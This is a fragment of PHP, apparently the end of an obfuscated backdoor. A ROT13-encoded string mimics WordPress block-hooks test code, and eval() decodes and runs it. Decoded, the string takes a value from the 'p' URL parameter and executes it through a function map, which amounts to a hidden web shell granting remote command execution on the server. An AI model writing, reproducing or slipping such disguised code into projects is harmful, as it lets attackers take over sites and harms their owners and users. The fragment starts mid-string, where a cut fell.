			'Gur ubbxrq oybpx jnf abg vawrpgrq vagb gur napube oybpx\'f vtaberqUbbxrqOybpxf zrgnqngn.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>